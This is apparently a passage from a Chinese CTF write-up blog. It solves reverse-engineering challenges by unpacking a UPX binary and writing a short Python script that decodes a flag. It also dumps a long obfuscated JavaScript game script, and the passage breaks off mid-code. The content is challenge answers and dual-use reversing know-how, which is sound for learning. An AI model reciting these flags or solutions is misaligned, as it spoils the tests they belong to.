125. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 126. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 127. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 128. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 129. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 130. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 131. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 132\u0026#39;\u0026#39;\u0026#39; 算是手搓个小小解释器吧。\nXor 查出来有 UPX 壳，先脱壳放进 IDA。\n在最后比较字符串的地方找到了一个加密过的 flag：\n加密过程如下：\n……\n加密过程过于繁琐，豁免还有几个类似加密逻辑。先尝试动调，试着输入密文，竟发现：\n难绷，非预期了（）\n俄语学习 最开始有 30 道俄语题目，不会用 pwntools，遂手自笔录到最后一步。\n最后这里对输入的内容有 sub_43AFAA() 和 sub_43A555() 两次操作。\nsub_43AFAA() 中调用 sub_4419E0() 生成一个船新的字符串 byte_4CB1E8，随后在 sub_441B00() 中做了一次 Xor Swap，RC4 中的第三个步骤加密即是 Xor Swap。\nsub_43A555() 中有一个字符串比较的操作，随后在 sub_43CBC0() 中同样调用 sub_441B00()。\n关键就在 byte_4CB1E8[i] = Str[i] + byte_4CAEE8[i] - 112; 这一句，动调之后能看见 byte_4CAEE8，于是上脚本：\n1\u0026gt;\u0026gt;\u0026gt; cip1 = \u0026#34;+i\u0026amp;[@Y:g8[\u0026amp;l$f8S8v$Y\u0026amp;e\u0026gt;{\u0026#34; 2\u0026gt;\u0026gt;\u0026gt; cip2 = [0x35, 0x6D, 0x35, 0x64, 0x35, 0x77, 0x35, 0x64, 0x35, 0x62, 0x35, 0x6E, 0x35, 0x6D, 0x35, 0x64, 0x35, 0x77, 0x35, 0x64, 0x35, 0x62, 0x35, 0x6E, 0x35, 0x6D, 0x35, 0x64, 0x35, 0x77, 0x35, 0x64, 0x35, 0x62, 0x35, 0x6E, 0x8E] 3\u0026gt;\u0026gt;\u0026gt; for i in range(len(cip1)): 4... print(chr(ord(cip1[i]) + 112 - cip2[i]), end = \u0026#39;\u0026#39;) 5... 6flag{Russian_is_so_easy} stick game 最绷不住的一题，本来是一血的，结果题目下了（）\n附件里的 Javascript 脚本里边有这么一坨：\n1function _0x3339(_0xc5a7d3,_0x197349){const _0x4be1b2=_0x271a();return _0x3339=function(_0x5f266e,_0x306e60){_0x5f266e=_0x5f266e-(0x1*-0x159c+-0x5*-0x69b+0x9*-0x10e);let _0x97d2a2=_0x4be1b2[_0x5f266e];if(_0x3339[\u0026#39;vsEbbX\u0026#39;]===undefined){var _0x4e47ab=function(_0x504f68){const _0x55694b=\u0026#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=\u0026#39;;let _0x4868cb=\u0026#39;\u0026#39;,_0x5f5158=\u0026#39;\u0026#39;;for(let _0x288bde=-0x1275+-0x96f*-0x4+0xeb*-0x15,_0x5400b3,_0x1abc9a,_0x5b8a10=-0x1715*-0x1+-0x2413+0xcfe;_0x1abc9a=_0x504f68[\u0026#39;charAt\u0026#39;](_0x5b8a10++);~_0x1abc9a\u0026amp;\u0026amp;(_0x5400b3=_0x288bde%(0xc*-0x27e+0x2*0xc11+-0x2*-0x2e5)?_0x5400b3*(0x1795*0x1+0x3*0x3b+-0x802*0x3)+_0x1abc9a:_0x1abc9a,_0x288bde++%(0x611+-0x70e+0x101))?_0x4868cb+=String[\u0026#39;fromCharCode\u0026#39;](-0x1bd9+-0x114a*0x2+-0x386*-0x12\u0026amp;_0x5400b3\u0026gt;\u0026gt;(-(-0xdcf+-0x5*0x51b+0x2758)*_0x288bde\u0026amp;0x22b7+-0x2548+0x3*0xdd)):-0x4*0x765+-0xe07+0x2b9b){_0x1abc9a=_0x55694b[\u0026#39;indexOf\u0026#39;](_0x1abc9a);}for(let _0x4deb0f=-0x11cf+-0x1b73*0x1+0x2*0x16a1,_0x529665=_0x4868cb[\u0026#39;length\u0026#39;];_0x4deb0f\u0026lt;_0x529665;_0x4deb0f++){_0x5f5158+=\u0026#39;%\u0026#39;+(\u0026#39;00\u0026#39;+_0x4868cb[\u0026#39;charCodeAt\u0026#39;](_0x4deb0f)[\u0026#39;toString\u0026#39;](0x14b*-0xa+0x1bd8+-0x76d*0x2))[\u0026#39;slice\u0026#39;](-(-0x10d5+0x1*0x265+0xe72));}return decodeURIComponent(_0x5f5158);};const _0x11fa5a=function(_0x4173dc,_0x5da0bd){let _0x48d668=[],_0x20d9fc=0xa31*0x1+0x252d*0x1+-0x2f5e,_0x1ab256,_0x59d767=\u0026#39;\u0026#39;;_0x4173dc=_0x4e47ab(_0x4173dc);let _0x15c31e;for(_0x15c31e=0x18e3*-0x1+0x12ff+0x5e4;_0x15c31e\u0026lt;-0x26f9+-0xb*-0x1fd+0x121a;_0x15c31e++){_0x48d668[_0x15c31e]=_0x15c31e;}for(_0x15c31e=-0x17bc+0x415+0x13a7;_0x15c31e\u0026lt;-0xa46+-0x1207+-0x1*-0x1d4d;_0x15c31e++){_0x20d9fc=(_0x20d9fc+_0x48d668[_0x15c31e]+_0x5da0bd[\u0026#39;charCodeAt\u0026#39;](_0x15c31e%_0x5da0bd[\u0026#39;length\u0026#39;]))%(0x1c5f+0x267b+-0x41da),_0x1ab256=_0x48d668[_0x15c31e],_0x48d668[_0x15c31e]=_0x48d668[_0x20d9fc],_0x48d668[_0x20d9fc]=_0x1ab256;}_0x15c31e=0x1450+0x139*0x5+-0x1a6d,_0x20d9fc=0x250e+-0x1*0x12fd+-0x1211;for(let _0x786500=-0x4*0x2e8+-0x452*-0x4+-0x5a8;_0x786500\u0026lt;_0x4173dc[\u0026#39;length\u0026#39;];_0x786500++){_0x15c31e=(_0x15c31e+(0x127a+-0xd*0x2f1+0x16*0xe6))%(0x1b69+0x10d*-0x25+0x54*0x26),_0x20d9fc=(_0x20d9fc+_0x48d668[_0x15c31e])%(0x144b+0xbf8+0x1f43*-0x1),_0x1ab256=_0x48d668[_0x15c31e],_0x48d668[_0x15c31e]=_0x48d668[_0x20d9fc],_0x48d668[_0x20d9fc]=_0x1ab256,_0x59d767+=String[\u0026#39;fromCharCode\u0026#39;](_0x4173dc[\u0026#39;charCodeAt\u0026#39;](_0x786500)^_0x48d668[(_0x48d668[_0x15c31e]+_0x48d668[_0x20d9fc])%(0x21b5+0x780+-0x2835)]);}return _0x59d767;};_0x3339[\u0026#39;fKEsSz\u0026#39;]=_0x11fa5a,_0xc5a7d3=arguments,_0x3339[\u0026#39;vsEbbX\u0026#39;]=!![];}const _0xdaf7a0=_0x4be1b2[0x1a7c+0x13a3*-0x1+-0x6d9],_0xe679c5=_0x5f266e+_0xdaf7a0,_0x223335=_0xc5a7d3[_0xe679c5];return!_0x223335?(_0x3339[\u0026#39;wQPYZX\u0026#39;]===undefined\u0026amp;\u0026amp;(_0x3339[\u0026#39;wQPYZX\u0026#39;]=!![]),_0x97d2a2=_0x3339[\u0026#39;fKEsSz\u0026#39;](_0x97d2a2,_0x306e60),_0xc5a7d3[_0xe679c5]=_0x97d2a2):_0x97d2a2=_0x223335,_0x97d2a2;},_0x3339(_0xc5a7d3,_0x197349);}(function(_0x56cb23,_0xed8547){const _0x18ee5d=_0x3339,_0x1e59ec=_0x56cb23();while(!![]){try{const _0x1325e2=-parseInt(_0x18ee5d(0x20d,\u0026#39;*!up\u0026#39;))/(-0x6a3*0x1+0x7b6+0x2*-0x89)*(parseInt(_0x18ee5d(0x2b8,\u0026#39;RTq]\u0026#39;))/(-0x1a9a+-0x19ac+-0x4*-0xd12))+parseInt(_0x18ee5d(0x276,\u0026#39;Ur3M\u0026#39;))/(0x90e+-0x47*0x30+-0x1*-0x445)*(-parseInt(_0x18ee5d(0x299,\u0026#39;Lj5i\u0026#39;))/(-0x22bd+-0x1*-0xdf+-0x10f1*-0x2))+parseInt(_0x18ee5d(0x286,\u0026#39;bK)(\u0026#39;))/(-0x1190+0x1*-0x220f+0x33a4)*(-parseInt(_0x18ee5d(0x287,\u0026#39;P0I8\u0026#39;))/(0xae+-0x7e5*0x2+0xf22))+-parseInt(_0x18ee5d(0x292,\u0026#39;*!up\u0026#39;))/(-0x1*-0x545+0x146a+0xcd4*-0x2)+-parseInt(_0x18ee5d(0x291,\u0026#39;B*#j\u0026#39;))/(-0xc83*0x1+0x17*-0x11a+0x25e1)*(-parseInt(_0x18ee5d(0x247,\u0026#39;a8v%\u0026#39;))/(-0x1ed3+0xb69*-0x2+0x1ad7*0x2))+-parseInt(_0x18ee5d(0x2a0,\u0026#39;D93x\u0026#39;))/(0x22bb+-0xa34*0x1+-0x187d)+parseInt(_0x18ee5d(0x23a,\u0026#39;euu1\u0026#39;))/(-0x10db+0xadd+-0x1*-0x609);if(_0x1325e2===_0xed8547)break;else _0x1e59ec[\u0026#39;push\u0026#39;](_0x1e59ec[\u0026#39;shift\u0026#39;]());}catch(_0x386714){_0x1e59ec[\u0026#39;push\u0026#39;](_0x1e59ec[\u0026#39;shift\u0026#39;]());}}}(_0x271a,-0xa4*-0x2aeb+-0x107909+0x3ec97),(function(){const _0x308b56=_0x3339,_0x52eac5={\u0026#39;EhRTr\u0026#39;:_0x308b56(0x253,\u0026#39;dm1K\u0026#39;)+_0x308b56(0x26e,\u0026#39;dm1K\u0026#39;),\u0026#39;kFogs\u0026#39;:_0x308b56(0x220,\u0026#39;XFw5\u0026#39;)+_0x308b56(0x22a,\u0026#39;5HLR\u0026#39;)+_0x308b56(0x283,\u0026#39;bK)(\u0026#39;)+_0x308b56(0x1f9,\u0026#39;t]@A\u0026#39;),\u0026#39;vSevM\u0026#39;:function(_0x235a00,_0x2ea75d){return _0x235a00(_0x2ea75d);},\u0026#39;OqHIS\u0026#39;:_0x308b56(0x202,\u0026#39;t]@A\u0026#39;),\u0026#39;QSAON\u0026#39;:function(_0x2ef78c,_0xca8978){return _0x2ef78c+_0xca8978;},\u0026#39;kZXWE\u0026#39;:_0x308b56(0x2bf,\u0026#39;dm1K\u0026#39;),\u0026#39;iOTog\u0026#39;:_0x308b56(0x1f8,\u0026#39;B*#j\u0026#39;),\u0026#39;ZAfQh\u0026#39;:function(_0x3b572b){return _0x3b572b();},\u0026#39;RUNZw\u0026#39;:function(_0x52df0c,_0x5865a2,_0x5794b1){return _0x52df0c(_0x5865a2,_0x5794b1);},\u0026#39;slyqV\u0026#39;:_0x308b56(0x22d,\u0026#39;dA#l\u0026#39;),\u0026#39;BzoKk\u0026#39;:_0x308b56(0x2a7,\u0026#39;5LZW\u0026#39;),\u0026#39;gmbzr\u0026#39;:function(_0x11c452,_0x57d0fc){return _0x11c452/_0x57d0fc;},\u0026#39;MpeHA\u0026#39;:function(_0x175f0e,_0x3ae62d){return _0x175f0e-_0x3ae62d;},\u0026#39;ndQmA\u0026#39;:_0x308b56(0x28e,\u0026#39;5HLR\u0026#39;),\u0026#39;GNiWK\u0026#39;:function(_0x4dea5c,_0x4b1649){return _0x4dea5c/_0x4b1649;},\u0026#39;uYZdk\u0026#39;:function(_0x451719,_0x4d2a0d){return _0x451719\u0026gt;_0x4d2a0d;},\u0026#39;SQqRY\u0026#39;:_0x308b56(0x210,\u0026#39;fEoa\u0026#39;)+_0x308b56(0x246,\u0026#39;tjJU\u0026#39;),\u0026#39;LnBhB\u0026#39;:function(_0x5335b2){return _0x5335b2();},\u0026#39;fHBqJ\u0026#39;:function(_0x3747e4){return _0x3747e4();},\u0026#39;exgXD\u0026#39;:_0x308b56(0x22c,\u0026#39;a75U\u0026#39;),\u0026#39;znGtf\u0026#39;:function(_0x4de0c7,_0x27d2c3){return _0x4de0c7/_0x27d2c3;},\u0026#39;OALlD\u0026#39;:function(_0x59141c){return _0x59141c();},\u0026#39;mZiDl\u0026#39;:function(_0xc634e5,_0x1193bd){return _0xc634e5+_0x1193bd;},\u0026#39;gjfUb\u0026#39;:_0x308b56(0x221,\u0026#39;]Udf\u0026#39;)+_0x308b56(0x298,\u0026#39;*!up\u0026#39;),\u0026#39;YgIGj\u0026#39;:function(_0x3ec1bd,_0xcd69c1){return _0x3ec1bd+_0xcd69c1;},\u0026#39;CCHCR\u0026#39;:function(_0x416100,_0x33db7a){return _0x416100+_0x33db7a;},\u0026#39;zHsVl\u0026#39;:_0x308b56(0x29a,\u0026#39;^Bu%\u0026#39;),\u0026#39;zgyPL\u0026#39;:function(_0x4048e5,_0x40930e){return _0x4048e5/_0x40930e;},\u0026#39;vxtVH\u0026#39;:function(_0x346552,_0x45d61a){return _0x346552-_0x45d61a;},\u0026#39;Arrgu\u0026#39;:function(_0xd88875,_0x11e4b8){return _0xd88875-_0x11e4b8;},\u0026#39;GyAQK\u0026#39;:function(_0x41ae1a,_0x1fe7fe){return _0x41ae1a+_0x1fe7fe;},\u0026#39;jUqPs\u0026#39;:function(_0x1541d1,_0x51f672){return _0x1541d1\u0026lt;_0x51f672;},\u0026#39;AexTD\u0026#39;:function(_0x42e7a1,_0x3b582e){return _0x42e7a1-_0x3b582e;},\u0026#39;bIMaZ\u0026#39;:function(_0x5ab1a4,_0x79b265){return _0x5ab1a4/_0x79b265;},\u0026#39;gcQLV\u0026#39;:function(_0x3a9735,_0x3209c3){return _0x3a9735-_0x3209c3;},\u0026#39;TDkZi\u0026#39;:function(_0x189284,_0x33cdf7){return _0x189284\u0026gt;=_0x33cdf7;},\u0026#39;Wdret\u0026#39;:_0x308b56(0x29f,\u0026#39;a75U\u0026#39;)+_0x308b56(0x218,\u0026#39;RTq]\u0026#39;)+_0x308b56(0x2c6,\u0026#39;6Ko7\u0026#39;)+_0x308b56(0x256,\u0026#39;RZQs\u0026#39;)+_0x308b56(0x279,\u0026#39;Ye)S\u0026#39;)+_0x308b56(0x200,\u0026#39;8Q\u0026amp;f\u0026#39;)+\u0026#39;5}\u0026#39;,\u0026#39;VxtbI\u0026#39;:_0x308b56(0x29c,\u0026#39;t]@A\u0026#39;),\u0026#39;GRrEE\u0026#39;:_0x308b56(0x26a,\u0026#39;bK)(\u0026#39;)+\u0026#39;e\u0026#39;,\u0026#39;USQaK\u0026#39;:function(_0x3d02c8){return _0x3d02c8();},\u0026#39;fiSOb\u0026#39;:_0x308b56(0x2ba,\u0026#39;Ur3M\u0026#39;)+_0x308b56(0x20c,\u0026#39;a8v%\u0026#39;)+_0x308b56(0x2a1,\u0026#39;ENZE\u0026#39;)+_0x308b56(0x20e,\u0026#39;itU6\u0026#39;)+_0x308b56(0x27a,\u0026#39;MT*D\u0026#39;)+_0x308b56(0x263,\u0026#39;MT*D\u0026#39;)+_0x308b56(0x209,\u0026#39;ezI0\u0026#39;)+_0x308b56(0x1f4,\u0026#39;t]@A\u0026#39;),\u0026#39;iwhST\u0026#39;:function(_0x308db1){return _0x308db1();},\u0026#39;idVYK\u0026#39;:function(_0x12d784){return _0x12d784();},\u0026#39;RPiDd\u0026#39;:function(_0x454974,_0x150af3){return _0x454974+_0x150af3;},\u0026#39;OMpyB\u0026#39;:function(_0x36c11d){return _0x36c11d();},\u0026#39;eDXUY\u0026#39;:function(_0x3a811d){return _0x3a811d();},\u0026#39;RLhuh\u0026#39;:function(_0x2dfc11){return _0x2dfc11();},\u0026#39;anOcA\u0026#39;:function(_0x18f562){return _0x18f562();},\u0026#39;SAccn\u0026#39;:_0x308b56(0x225,\u0026#39;BW0h\u0026#39;)},_0x1f601f=(function(){let _0x4d0af0=!![];return function(_0x51009e,_0x166e32){const _0x371342=_0x4d0af0?function(){const _0x6ab774=_0x3339;if(_0x166e32){const _0x380d67=_0x166e32[_0x6ab774(0x24f,\u0026#39;n1#6\u0026#39;)](_0x51009e,arguments);return _0x166e32=null,_0x380d67;}}:function(){};return _0x4d0af0=![],_0x371342;};}());(function(){const _0x44162e=_0x308b56,_0x224f5c={\u0026#39;jzGoq\u0026#39;:_0x52eac5[_0x44162e(0x266,\u0026#39;[(5W\u0026#39;)],\u0026#39;brIEg\u0026#39;:_0x52eac5[_0x44162e(0x20a,\u0026#39;q!6(\u0026#39;)],\u0026#39;puohs\u0026#39;:function(_0x211ebb,_0x3dbfcb){const _0x4ab761=_0x44162e;return _0x52eac5[_0x4ab761(0x2c3,\u0026#39;8Q\u0026amp;f\u0026#39;)](_0x211ebb,_0x3dbfcb);},\u0026#39;CGrSR\u0026#39;:_0x52eac5[_0x44162e(0x1ed,\u0026#39;PDC0\u0026#39;)],\u0026#39;oBgMA\u0026#39;:function(_0x46549a,_0x3b8843){const _0x2ee089=_0x44162e;return _0x52eac5[_0x2ee089(0x234,\u0026#39;ezI0\u0026#39;)](_0x46549a,_0x3b8843);},\u0026#39;YQRSZ\u0026#39;:_0x52eac5[_0x44162e(0x2c0,\u0026#39;qcm2\u0026#39;)],\u0026#39;IYvua\u0026#39;:function(_0x2ec52a,_0x4e0998){const _0x59c596=_0x44162e;return _0x52eac5[_0x59c596(0x203,\u0026#39;hv\u0026amp;k\u0026#39;)](_0x2ec52a,_0x4e0998);},\u0026#39;WpokC\u0026#39;:_0x52eac5[_0x44162e(0x275,\u0026#39;6Ko7\u0026#39;)],\u0026#39;cBwSZ\u0026#39;:function(_0x956a27){const _0x4cbe06=_0x44162e;return _0x52eac5[_0x4cbe06(0x1fb,\u0026#39;n1#6\u0026#39;)](_0x956a27);}};_0x52eac5[_0x44162e(0x24c,\u0026#39;ENZE\u0026#39;)](_0x1f601f,this,function(){const _0x177f71=_0x44162e,_0x3bf1f5=new RegExp(_0x224f5c[_0x177f71(0x24b,\u0026#39;909%\u0026#39;)]),_0x3d78c3=new RegExp(_0x224f5c[_0x177f71(0x2b0,\u0026#39;909%\u0026#39;)],\u0026#39;i\u0026#39;),_0x7ff872=_0x224f5c[_0x177f71(0x267,\u0026#39;]Udf\u0026#39;)](_0x31b643,_0x224f5c[_0x177f71(0x1fd,\u0026#39;dm1K\u0026#39;)]);!_0x3bf1f5[_0x177f71(0x214,\u0026#39;qcm2\u0026#39;)](_0x224f5c[_0x177f71(0x2ac,\u0026#39;fEoa\u0026#39;)](_0x7ff872,_0x224f5c[_0x177f71(0x2af,\u0026#39;ezI0\u0026#39;)]))||!_0x3d78c3[_0x177f71(0x26c,\u0026#39;XFw5\u0026#39;)](_0x224f5c[_0x177f71(0x230,\u0026#39;P0I8\u0026#39;)](_0x7ff872,_0x224f5c[_0x177f71(0x2ad,\u0026#39;q!6(\u0026#39;)]))?_0x224f5c[_0x177f71(0x2c7,\u0026#39;qcm2\u0026#39;)](_0x7ff872,\u0026#39;0\u0026#39;):_0x224f5c[_0x177f71(0x222,\u0026#39;FmLR\u0026#39;)](_0x31b643);})();}()),realScore=-0x1*0x16e1+-0xacd+0x21ae,window[_0x308b56(0x219,\u0026#39;euPU\u0026#39;)]=function(_0xb25880){const _0x1f6358=_0x308b56;if(!lastTimestamp){lastTimestamp=_0xb25880,window[_0x1f6358(0x273,\u0026#39;MT*D\u0026#39;)+_0x1f6358(0x206,\u0026#39;PDC0\u0026#39;)+\u0026#39;e\u0026#39;](animate);return;}switch(phase){case _0x52eac5[_0x1f6358(0x272,\u0026#39;!i*w\u0026#39;)]:return;case _0x52eac5[_0x1f6358(0x1ef,\u0026#39;RZQs\u0026#39;)]:{sticks[_0x1f6358(0x239,\u0026#39;t]@A\u0026#39;)]()[_0x1f6358(0x2a8,\u0026#39;RZQs\u0026#39;)]+=_0x52eac5[_0x1f6358(0x2c4,\u0026#39;n1#6\u0026#39;)](_0x52eac5[_0x1f6358(0x264,\u0026#39;8Q\u0026amp;f\u0026#39;)](_0xb25880,lastTimestamp),stretchingSpeed);break;}case _0x52eac5[_0x1f6358(0x241,\u0026#39;kBNH\u0026#39;)]:{sticks[_0x1f6358(0x21e,\u0026#39;hv\u0026amp;k\u0026#39;)]()[_0x1f6358(0x254,\u0026#39;5HLR\u0026#39;)]+=_0x52eac5[_0x1f6358(0x26b,\u0026#39;euu1\u0026#39;)](_0x52eac5[_0x1f6358(0x255,\u0026#39;HpW7\u0026#39;)](_0xb25880,lastTimestamp),turningSpeed);if(_0x52eac5[_0x1f6358(0x223,\u0026#39;dm1K\u0026#39;)](sticks[_0x1f6358(0x25a,\u0026#39;5HLR\u0026#39;)]()[_0x1f6358(0x2bb,\u0026#39;n1#6\u0026#39;)],0x4f*0x31+-0x1f5*0x7+-0x112)){sticks[_0x1f6358(0x211,\u0026#39;BW0h\u0026#39;)]()[_0x1f6358(0x24e,\u0026#39;1@19\u0026#39;)]=-0x67*0x2e+-0x1*0x2002+-0x22*-0x17f;const [_0x251f65,_0x5cb259]=_0x52eac5[_0x1f6358(0x1fe,\u0026#39;5HLR\u0026#39;)](thePlatformTheStickHits);if(_0x251f65){const _0x1a00f7=_0x52eac5[_0x1f6358(0x297,\u0026#39;uvWL\u0026#39;)][_0x1f6358(0x26d,\u0026#39;dm1K\u0026#39;)](\u0026#39;|\u0026#39;);let _0x35cc17=0x1781*0x1+0x6cc*0x1+0x1e4d*-0x1;while(!![]){switch(_0x1a00f7[_0x35cc17++]){case\u0026#39;0\u0026#39;:scoreElement[_0x1f6358(0x2a5,\u0026#39;hICu\u0026#39;)]=realScore;continue;case\u0026#39;1\u0026#39;:realScore+=_0x5cb259?-0x486+0x4*0x665+-0x1c1*0xc:-0xf*0x1d1+-0x3ee+0x1f2e;continue;case\u0026#39;2\u0026#39;:score=realScore;continue;case\u0026#39;3\u0026#39;:_0x5cb259\u0026amp;\u0026amp;(perfectElement[_0x1f6358(0x23c,\u0026#39;YyQk\u0026#39;)][_0x1f6358(0x268,\u0026#39;kBNH\u0026#39;)]=-0x2d6*-0x1+0x2*0x78d+0x11ef*-0x1,_0x52eac5[_0x1f6358(0x242,\u0026#39;a8v%\u0026#39;)](setTimeout,()=\u0026gt;perfectElement[_0x1f6358(0x290,\u0026#39;^Bu%\u0026#39;)][_0x1f6358(0x21c,\u0026#39;B*#j\u0026#39;)]=0x79d*0x4+0x223a+-0x40ae,-0x1102+-0x343+-0x182d*-0x1));continue;case\u0026#39;4\u0026#39;:_0x52eac5[_0x1f6358(0x2a4,\u0026#39;!i*w\u0026#39;)](generateTree);continue;case\u0026#39;5\u0026#39;:_0x52eac5[_0x1f6358(0x213,\u0026#39;6Ko7\u0026#39;)](generatePlatform);continue;case\u0026#39;6\u0026#39;:_0x52eac5[_0x1f6358(0x258,\u0026#39;B*#j\u0026#39;)](generateTree);continue;}break;}}phase=_0x52eac5[_0x1f6358(0x2aa,\u0026#39;hv\u0026amp;k\u0026#39;)];}break;}case _0x52eac5[_0x1f6358(0x27d,\u0026#39;q!6(\u0026#39;)]:{heroX+=_0x52eac5[_0x1f6358(0x233,\u0026#39;ENZE\u0026#39;)](_0x52eac5[_0x1f6358(0x229,\u0026#39;]Udf\u0026#39;)](_0xb25880,lastTimestamp),walkingSpeed);const [_0x3474f0]=_0x52eac5[_0x1f6358(0x23d,\u0026#39;euPU\u0026#39;)](thePlatformTheStickHits);if(_0x3474f0){const _0x4fec81=_0x52eac5[_0x1f6358(0x2c2,\u0026#39;BW0h\u0026#39;)](_0x52eac5[_0x1f6358(0x250,\u0026#39;dA#l\u0026#39;)](_0x3474f0[\u0026#39;x\u0026#39;],_0x3474f0[\u0026#39;w\u0026#39;]),heroDistanceFromEdge);_0x52eac5[_0x1f6358(0x25e,\u0026#39;RZQs\u0026#39;)](heroX,_0x4fec81)\u0026amp;\u0026amp;(heroX=_0x4fec81,phase=_0x52eac5[_0x1f6358(0x216,\u0026#39;!i*w\u0026#39;)]);}else{const _0x1e010c=_0x52eac5[_0x1f6358(0x2a9,\u0026#39;itU6\u0026#39;)](_0x52eac5[_0x1f6358(0x251,\u0026#39;YyQk\u0026#39;)](sticks[_0x1f6358(0x265,\u0026#39;Wx%z\u0026#39;)]()[\u0026#39;x\u0026#39;],sticks[_0x1f6358(0x265,\u0026#39;Wx%z\u0026#39;)]()[_0x1f6358(0x274,\u0026#39;Ye)S\u0026#39;)]),heroWidth);_0x52eac5[_0x1f6358(0x2b1,\u0026#39;Wx%z\u0026#39;)](heroX,_0x1e010c)\u0026amp;\u0026amp;(heroX=_0x1e010c,phase=_0x52eac5[_0x1f6358(0x28f,\u0026#39;tjJU\u0026#39;)]);}break;}case _0x52eac5[_0x1f6358(0x1f2,\u0026#39;5HLR\u0026#39;)]:{sceneOffset+=_0x52eac5[_0x1f6358(0x207,\u0026#39;*!up\u0026#39;)](_0x52eac5[_0x1f6358(0x2bc,\u0026#39;ev%m\u0026#39;)](_0xb25880,lastTimestamp),transitioningSpeed);const [_0x24ea65]=_0x52eac5[_0x1f6358(0x288,\u0026#39;XFw5\u0026#39;)](thePlatformTheStickHits);_0x52eac5[_0x1f6358(0x2b1,\u0026#39;Wx%z\u0026#39;)](sceneOffset,_0x52eac5[_0x1f6358(0x227,\u0026#39;P0I8\u0026#39;)](_0x52eac5[_0x1f6358(0x29e,\u0026#39;5HLR\u0026#39;)](_0x24ea65[\u0026#39;x\u0026#39;],_0x24ea65[\u0026#39;w\u0026#39;]),paddingX))\u0026amp;\u0026amp;(sticks[_0x1f6358(0x23f,\u0026#39;B*#j\u0026#39;)]({\u0026#39;x\u0026#39;:_0x52eac5[_0x1f6358(0x232,\u0026#39;^Bu%\u0026#39;)](_0x24ea65[\u0026#39;x\u0026#39;],_0x24ea65[\u0026#39;w\u0026#39;]),\u0026#39;length\u0026#39;:0x0,\u0026#39;rotation\u0026#39;:0x0}),phase=_0x52eac5[_0x1f6358(0x22f,\u0026#39;RZQs\u0026#39;)]);break;}case _0x52eac5[_0x1f6358(0x27b,\u0026#39;bK)(\u0026#39;)]:{if(_0x52eac5[_0x1f6358(0x24d,\u0026#39;^Bu%\u0026#39;)](sticks[_0x1f6358(0x259,\u0026#39;Lj5i\u0026#39;)]()[_0x1f6358(0x2b6,\u0026#39;a75U\u0026#39;)],0x68c+-0xb87+0x5*0x123))sticks[_0x1f6358(0x215,\u0026#39;euPU\u0026#39;)]()[_0x1f6358(0x270,\u0026#39;5LZW\u0026#39;)]+=_0x52eac5[_0x1f6358(0x2a2,\u0026#39;bK)(\u0026#39;)](_0x52eac5[_0x1f6358(0x1f1,\u0026#39;dA#l\u0026#39;)](_0xb25880,lastTimestamp),turningSpeed);heroY+=_0x52eac5[_0x1f6358(0x278,\u0026#39;YyQk\u0026#39;)](_0x52eac5[_0x1f6358(0x238,\u0026#39;]Udf\u0026#39;)](_0xb25880,lastTimestamp),fallingSpeed);const _0x5e701d=_0x52eac5[_0x1f6358(0x2be,\u0026#39;8Q\u0026amp;f\u0026#39;)](_0x52eac5[_0x1f6358(0x1fc,\u0026#39;6Ko7\u0026#39;)](platformHeight,-0x413+0x327+0x6*0x38),_0x52eac5[_0x1f6358(0x208,\u0026#39;HpW7\u0026#39;)](_0x52eac5[_0x1f6358(0x2c5,\u0026#39;t]@A\u0026#39;)](window[_0x1f6358(0x25b,\u0026#39;P0I8\u0026#39;)+\u0026#39;t\u0026#39;],canvasHeight),-0xaac+-0x1ebf*-0x1+0x1*-0x1411));if(_0x52eac5[_0x1f6358(0x252,\u0026#39;tjJU\u0026#39;)](heroY,_0x5e701d)){_0x52eac5[_0x1f6358(0x201,\u0026#39;q!6(\u0026#39;)](realScore,-0x1847a0+0x1edb3d+-0xb*-0x141e2)\u0026amp;\u0026amp;_0x52eac5[_0x1f6358(0x2b2,\u0026#39;BW0h\u0026#39;)](alert,_0x52eac5[_0x1f6358(0x21b,\u0026#39;itU6\u0026#39;)]);restartButton[_0x1f6358(0x20f,\u0026#39;8Q\u0026amp;f\u0026#39;)][_0x1f6358(0x29b,\u0026#39;t]@A\u0026#39;)]=_0x52eac5[_0x1f6358(0x289,\u0026#39;t]@A\u0026#39;)];return;}break;}default:throw _0x52eac5[_0x1f6358(0x2cd,\u0026#39;dm1K\u0026#39;)](Error,_0x52eac5[_0x1f6358(0x248,\u0026#39;euu1\u0026#39;)]);}_0x52eac5[_0x1f6358(0x296,\u0026#39;Lj5i\u0026#39;)](draw),window[_0x1f6358(0x2ae,\u0026#39;ev%m\u0026#39;)+_0x1f6358(0x1ff,\u0026#39;t]@A\u0026#39;)+\u0026#39;e\u0026#39;](animate),lastTimestamp=_0xb25880;},window[_0x308b56(0x257,\u0026#39;YyQk\u0026#39;)]=function(){const _0x556c69=_0x308b56,_0x5272c2=_0x52eac5[_0x556c69(0x249,\u0026#39;C\u0026amp;a\u0026amp;\u0026#39;)][_0x556c69(0x25f,\u0026#39;itU6\u0026#39;)](\u0026#39;|\u0026#39;);let _0x239782=-0x1bf4+-0x1db8*-0x1+0x4*-0x71;while(!![]){switch(_0x5272c2[_0x239782++]){case\u0026#39;0\u0026#39;:_0x52eac5[_0x556c69(0x20b,\u0026#39;[(5W\u0026#39;)](generatePlatform);continue;case\u0026#39;1\u0026#39;:_0x52eac5[_0x556c69(0x280,\u0026#39;itU6\u0026#39;)](draw);continue;case\u0026#39;2\u0026#39;:_0x52eac5[_0x556c69(0x236,\u0026#39;Wx%z\u0026#39;)](generateTree);continue;case\u0026#39;3\u0026#39;:phase=_0x52eac5[_0x556c69(0x245,\u0026#39;uvWL\u0026#39;)];continue;case\u0026#39;4\u0026#39;:lastTimestamp=undefined;continue;case\u0026#39;5\u0026#39;:heroX=_0x52eac5[_0x556c69(0x21f,\u0026#39;C\u0026amp;a\u0026amp;\u0026#39;)](_0x52eac5[_0x556c69(0x2c8,\u0026#39;[(5W\u0026#39;)](platforms[0x17d*0x3+0xcdf*0x3+-0x6*0x72e][\u0026#39;x\u0026#39;],platforms[-0xc0a+0x10d2+-0x12*0x44][\u0026#39;w\u0026#39;]),heroDistanceFromEdge);continue;case\u0026#39;6\u0026#39;:_0x52eac5[_0x556c69(0x1fa,\u0026#39;6Ko7\u0026#3